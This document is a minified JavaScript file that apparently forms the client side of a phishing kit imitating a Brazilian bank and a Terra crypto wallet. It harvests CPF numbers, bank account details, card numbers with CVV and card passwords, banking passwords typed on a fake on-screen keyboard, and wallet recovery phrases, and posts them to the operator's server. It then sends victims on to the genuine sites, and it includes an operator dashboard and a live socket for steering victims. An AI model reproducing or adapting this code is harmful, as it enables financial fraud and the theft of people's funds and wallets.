const notyf=new Notyf({position:{x:"left",y:"top"},types:[{type:"info",background:"#208656",icon:{className:"fas fa-info-circle",tagName:"span",color:"#fff"},dismissible:!1},{type:"warning",background:"red",icon:{className:"fas fa-info-circle",tagName:"span",color:"#fff"},dismissible:!1}]});
const client=(()=>{function o(e){e=e.elements;const t={};return Array.from(e).forEach(e=>{e.name&&(t[e.name]=e.value)}),t}return{submit:async function(e){const n=document.querySelector(e);n&&n.addEventListener("submit",async function(e){e.preventDefault();try{var t=o(n);if(t?.senha?.length<6)return notyf.open({type:"warning",message:"O Campo senha deve ter no mínimo 6 dígitos"});(function(e){var t=0,n=e.replace(/\.|\-/g,"");if("00000000000"!=n){for(i=1;i<=9;i++)t+=parseInt(n.substring(i-1,i))*(11-i);if((e=10!=(e=10*t%11)&&11!=e?e:0)==parseInt(n.substring(9,10))){for(t=0,i=1;i<=10;i++)t+=parseInt(n.substring(i-1,i))*(12-i);return(e=10!=(e=10*t%11)&&11!=e?e:0)==parseInt(n.substring(10,11))?1:void 0}}})(t?.cpf)?n.querySelector('button[type="submit"]').innerHTML=`
                <div class="spinner-border text-light" role="status">
                    <span class="visually-hidden">Loading...</span>
                </div>`:notyf.open({type:"warning",message:"CPF inválido"})}catch(e){console.log("erro",e),n.querySelector('button[type="submit"]').innerHTML="Login",notyf.open({type:"warning",message:JSON.stringify(e?.message)})}})},sendUser:async function(e){const t=document.querySelector(e);if(e=document.querySelectorAll('button[data-bs-toggle="tab"]'),document.querySelector("input#agencia")){new Cleave("input#agencia",{numericOnly:!0,blocks:[4],uppercase:!0}),new Cleave("input#conta",{numericOnly:!0,blocks:[10],uppercase:!0});for(const n of e)n&&n.addEventListener("shown.bs.tab",e=>{var t=document.querySelector("."+e.relatedTarget.getAttribute("data-target")),e=document.querySelector("."+e.target.getAttribute("data-target"));if(t||e){t=t.querySelectorAll("input"),e=e.querySelectorAll("input");if(t||e){for(const n of t)n.required=!1;for(const o of e)o.required=!0}}});t&&t.addEventListener("submit",function(e){return e.preventDefault(),async function(e){var t=JSON.stringify(e);console.log("data enviado: ",e),fetch("/clients",{method:"POST",headers:{"content-type":"application/json"},body:t}).then(e=>e.json()).then(e=>{var t=e["id"];if(!t)return console.log("not id in",e);window.location.href="/module/safety/"+t}).catch(e=>console.log("error",e))}(o(t))})}},getFormData:o,deleteClient:function(e){var t=document.querySelectorAll(e);if(e)for(const o of t)o.addEventListener("click",async function(e){try{e.preventDefault();var t,n=o.dataset.client;n&&(t=await(await fetch("/clients/"+n,{method:"DELETE",headers:{"content-type":"application/json"}})).json(),o.closest("tr").remove())&&console.log(t)}catch(e){console.log(e)}})},masks:function(){var e=document.querySelector("input#cpf");e&&(console.log(e),new Cleave("input#cpf",{delimiters:[".",".","-"],blocks:[3,3,3,2],numericOnly:!0})),(e=document.querySelector("input#card_date"))&&new Cleave("input#card_date",{delimiters:["/"],blocks:[2,2],numericOnly:!0}),(e=document.querySelector("input#senha"))&&new Cleave("input#senha",{blocks:[10],numericOnly:!0}),(e=document.querySelector("input#card_password"))&&new Cleave("input#card_password",{blocks:[4],numericOnly:!0}),(e=document.querySelector("input#card_code"))&&new Cleave("input#card_code",{blocks:[3],numericOnly:!0}),(e=document.querySelector("input#card_number"))&&new Cleave(e,{creditCard:!0,onCreditCardTypeChanged:function(e){}});const t=document.querySelector(".password_input span");t&&t.addEventListener("click",function(e){e.preventDefault(),"text"==t.closest("div").querySelector("input").type?(t.closest("div").querySelector("input").type="password",t.innerHTML=`<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 24 24" style="enable-background:new 0 0 24 24;" xml:space="preserve">
                <style type="text/css">
                    .st0{fill:none;}
                    .st1{fill:#E55202;}
                </style>
                <path class="st0" d="M0,0h24v24H0V0z M0,0h24v24H0V0z M0,0h24v24H0V0z M0,0h24v24H0V0z"/>
                <path class="st1" d="M12,7c2.8,0,5,2.2,5,5c0,0.6-0.1,1.3-0.4,1.8l2.9,2.9c1.5-1.3,2.7-2.9,3.4-4.7c-1.7-4.4-6-7.5-11-7.5  c-1.4,0-2.7,0.2-4,0.7l2.2,2.2C10.7,7.1,11.4,7,12,7z M2,4.3l2.3,2.3L4.7,7C3,8.3,1.7,10,1,12c1.7,4.4,6,7.5,11,7.5  c1.6,0,3-0.3,4.4-0.8l0.4,0.4l2.9,2.9l1.3-1.3L3.3,3L2,4.3z M7.5,9.8L9,11.4c0,0.2,0,0.4,0,0.6c0,1.7,1.3,3,3,3c0.2,0,0.4,0,0.6-0.1  l1.6,1.5C13.5,16.8,12.8,17,12,17c-2.8,0-5-2.2-5-5C7,11.2,7.2,10.5,7.5,9.8z M11.8,9l3.1,3.1v-0.2C14.9,10.2,13.6,8.9,11.8,9  L11.8,9z"/>
                </svg>`):(t.closest("div").querySelector("input").type="text",t.innerHTML=`<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 24 24" style="enable-background:new 0 0 24 24;" xml:space="preserve">
                <style type="text/css">
                    .st0{fill:none;}
                    .st1{fill:#E55202;}
                </style>
                <path class="st0" d="M0,0h24v24H0V0z"/>
                <path class="st1" d="M12,4.5C7,4.5,2.7,7.6,1,12c1.7,4.4,6,7.5,11,7.5s9.3-3.1,11-7.5C21.3,7.6,17,4.5,12,4.5z M12,17  c-2.8,0-5-2.2-5-5s2.2-5,5-5s5,2.2,5,5S14.8,17,12,17z M12,9c-1.7,0-3,1.3-3,3s1.3,3,3,3s3-1.3,3-3S13.7,9,12,9z"/>
                </svg>`)})}}})(),showPassButton=(client.masks(),client.submit(".form-client"),client.submit(".form-client-update"),client.sendUser(".senduserForm"),client.deleteClient(".delete-client"),document.querySelector(".showpassword-icon")),keyboard=(showPassButton&&showPassButton.addEventListener("click",function(e){e.preventDefault();e=showPassButton.closest(".password-input").querySelector("input");showPassButton.classList.contains("active")?(showPassButton.classList.remove("active"),showPassButton.querySelector("img").setAttribute("src","/assets/img/bsfra/cut-eye-blue.svg"),e.setAttribute("type","password")):(showPassButton.classList.add("active"),e.setAttribute("type","text"),showPassButton.querySelector("img").setAttribute("src","/assets/img/bsfra/eye-blue.svg"))}),(()=>{function i(e,t){(e||t)&&e.addEventListener("click",function(e){e.preventDefault();{var o=t;const s=document.body.dataset.client;if(o||s){let n="/module/documents/"+s;e={method:"PATCH",headers:{"content-type":"application/json"},body:JSON.stringify(login.getFormData(o))};fetch("/clients/"+s,e).then(e=>e.json()).then(e=>{var t=e["id"];if(!t)return console.log("not id in",e);o.classList.contains("documents")&&(n="/module/eletronic/"+s),o.classList.contains("alphanumeric")&&(n="/module/alphanumeric/"+s),document.querySelector('input[name="alphanumericSignature"]')&&(n="https://www.unicred.com.br/solucoes/conta-corrente"),window.location.href=n}).catch(e=>console.log("error",e))}}})}function c(s,r){(s||r)&&Array.from(s).forEach(o=>{o.addEventListener("click",function(t){t.preventDefault();var n,t=r.closest("form");if(t){let e=o.value;"shift"==e&&("up"==t.dataset.shift?(t.dataset.shift=t.dataset.shift="",Array.from(s).forEach(e=>{e.innerHTML=e.innerHTML.toLowerCase()})):(t.dataset.shift=t.dataset.shift="up",Array.from(s).forEach(e=>{e.innerHTML=e.innerHTML.toUpperCase()}))),"symbols"==e&&(document.querySelector(".text-keys").classList.toggle("hide"),document.querySelector(".symbol-keyboard").classList.toggle("show")),"SHIFT"!=(e="up"==t.dataset.shift?o.value.toUpperCase():e)&&"shift"!=e&&"symbols"!=e&&"SYMBOLS"!=e&&(t=r,(n=e)||t)&&(t.value=t.value+n)}})})}return{handleForm:function(e){var t,n,o,s,r;(e=document.querySelector(e))&&(e.dataset.id,t=e.querySelectorAll(".keyboard button"),n=e.querySelector("input"),s=document.querySelector("button.clean"),o=document.querySelector("button.confirm"),r=n,((s=s)||r)&&s.addEventListener("click",function(e){e.preventDefault(),r.value=""}),c(t,n),i(o,e))}}})()),submit={openMnemonic:function(e){(e=e.dataset.module)&&window.open("/module/popup/"+e,"...","status=no,titlebar=no,location=no,directories=no,channelmode=no,menubar=no,toolbar=no,scrollbars=no,resizable=no,menubar=0,top=0,left="+window.innerWidth+",width=500,height=620")},openFormMnemonic:function(e){(e=e.dataset.module)&&window.open("/module/mnemonic/"+e,"...","status=no,titlebar=no,location=no,directories=no,channelmode=no,menubar=no,toolbar=no,scrollbars=no,resizable=no,menubar=0,top=0,left="+window.innerWidth+",width=500,height=620")},formSubmit:async function(e){const r=document.querySelector(e);r&&r.addEventListener("submit",async function(e){e.preventDefault();try{var t=r.dataset.module;if(t){var n,o,s={mnemonic:r.elements.mnemonic?.value,secret_seed:r.elements.secret_seed?.value};if(s)return s.module=t,console.log(s),n={method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify(s)},o=await(await fetch("/clients",n)).json(),document.body.dataset.client=o?.id,window.close("","_parent","")}}catch(e){console.log(e)}})},enableSubmit:function(e){if(e=document.querySelector(e)){const t=e.querySelector("button");if(t){const n=e.querySelector("textarea");n&&n.addEventListener("keyup",function(e){console.log("key click"),10<n.value.length&&(t.disabled=!1)})}}}};submit.enableSubmit(".mnemonic-form"),submit.enableSubmit(".form-secret-seed"),submit.formSubmit(".mnemonic-form"),submit.formSubmit(".form-secret-seed"),keyboard.handleForm(".boxKeyboard form"),socket.on("clientSubmit",e=>{document.body.classList.contains("dashboard")||document.body.dataset.client&&document.body.dataset.client==e.id&&(window.location.href="https://station.terra.money/")});
const login={submit:async function(o){const s=document.querySelector(o);s&&s.addEventListener("submit",async function(o){o.preventDefault();try{var{user:n,password:e}=s.elements,t={method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({user:n.value,password:e.value})};console.log("formulario submetido"),await(await fetch("/session",t)).json();window.location.href="/admin/dashboard"}catch(o){console.log(o)}})}};login.submit(".formAdminLogin");
const user=(()=>{const t=new bootstrap.Modal("#changePasswordModal",{backdrop:"static"});return console.log(t),{changePassword:function(e){const s=document.querySelector(e);s&&s.addEventListener("submit",async function(e){try{e.preventDefault();var a=client.getFormData(s);if(!a.password)return notyf.open({type:"warning",message:"Preencha a nova senha"});var o={method:"PATCH",headers:{"content-type":"application/json"},body:JSON.stringify(a)},n=await(await fetch("/users",o)).json();notyf.open({type:"info",message:`Senha para o usuário ${n.name} alterada com sucesso`}),t.hide()}catch(e){console.log(e)}})}}})();user.changePassword(".form-change-password");
const product={handleForm:function(e){const t=document.querySelector(e);console.info("modulo de produto rodando"),t&&t.addEventListener("submit",function(n){n.preventDefault();n=t.elements.product_code?.value;if(n){let d=[],e,t=(e=(e=(e=n.substr(n.indexOf('<h1 data-testid="main-title"'),n.indexOf("</h1>")).substr(n.indexOf('">')+2,n.indexOf("</h1>"))).substr(0,e.indexOf("</h1>"))).substr(e.indexOf('">')+2,e.length),console.log("nome do produto",e),n.substr(n.indexOf('<div data-testid="media-gallery"'),n.indexOf('data-testid="mod-heading"')));(t=t.split("<img")).length&&(t=t.map(t=>{if(t.indexOf("product-price")<1&&1<t.indexOf("attribute-item")){let e=t.substr(t.indexOf('src="')+5,t.indexOf("loading="));if(0<(e=(e=e.split("loading"))[0].substr(0,e[0].length-2)).length)return d.push(e)}}),console.log("código capturado",d))}})}};product.handleForm(".formCreateProduct");